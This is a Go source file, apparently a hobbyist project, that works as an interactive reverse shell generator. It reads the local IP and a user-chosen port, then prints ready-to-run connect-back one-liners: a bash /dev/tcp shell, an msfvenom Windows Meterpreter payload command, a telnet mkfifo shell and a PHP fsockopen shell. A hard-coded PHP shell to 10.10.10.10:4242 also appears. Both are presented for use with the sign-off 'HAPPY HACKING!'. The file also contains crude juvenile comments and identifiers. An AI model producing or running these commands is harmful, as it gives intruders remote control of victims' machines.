//I wanted to create a little reverse shell maker
//playing a little with the "fmt" package
//have fun reading my code lel
package main

import (
	"fmt"
	"log"
	"net"
	"time"
)

/*func lstOfRevShells() {
const bashS = done
const phpS = done
const javaS =
const perlS =
const pythonS =
const rubyS =
const ncS =
}*/

//@formatter:off

var denis =     "penis" // i am the ugly formatter from GOland and now i am off
						// because of this sweet comments

//@formatter:on

// Get preferred outbound ip of this machine
func supply() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	//fmt.Println(localAddr.IP)
	//get local ip part is over and the lexical part begins
	const intMessage = "Hello user, let us create so reverse shells! What we going to choose today?"
	const listOfShells = "1. Bash Reverse Shell.\n2. Windows Meterpreter Staged Reverse TCP (x64).\n" +
		"3. Telnet Reverse Shell.\n" +
		"4. PHP Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
	fmt.Println(intMessage, "\n"+listOfShells)
	fmt.Println("So what shell we going to take?\nJust choose the right number:")
	// var then variable name then variable type
	var choosenS string
	// Taking input from user
	fmt.Scanln(&choosenS)
	fmt.Println("What Port we going to use?\nJust type the right port:")
	var choosenP string
	const denesinhno = "penesinhno"
	_ = denesinhno
	fmt.Scanln(&choosenP)
	//two friends dan and lens = together the autoanswer
	var dan = "you took"
	var lens = "shell\nHere is your shell, just copy it, HAPPY HACKING!" +
		" Press CTRL+C to stop this programm!"
	fmt.Println(dan, choosenS, lens)
	var ipa = localAddr.IP
	switch choosenS {
	case "1", "Bash Reverse Shell", "Bash", "bash":
		fmt.Print("sh -i >& /dev/tcp/", ipa, "/", choosenP, " 0>&1\n")
	case "2", "Windows Meterpreter Staged Reverse TCP (x64)":
		fmt.Print("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=", ipa,
			" LPORT=", choosenP, " -f exe -o reverse.exe\n")
	case "3", "Telnet", "telnet":
		fmt.Print("TF=$(mktemp -u);mkfifo $TF && telnet ", ipa, " ", choosenP, " 0<$TF | sh 1>$TF")
	case "4", "PHP", "Php", "php":
		const phpO, phpT = "php -r '$sock=fsockopen(\"", ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
		fmt.Print(phpO, ipa, ",", choosenP, phpT)

	}
	return localAddr.IP
}

func runForever() {
	for {
		//fmt.Printf("%v+\n", time.Now())
		time.Sleep(time.Second)
	}
}

func a() {
	var phpO = "php -r '$sock=fsockopen(\"10.10.10.10\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	fmt.Println(phpO)
	/*var result =
	fmt.Printf("%q", result)*/
}

//@formatter:off
func main() {
	//never get high on your own:
	 supply()

	 runForever()
}
//@formatter:on

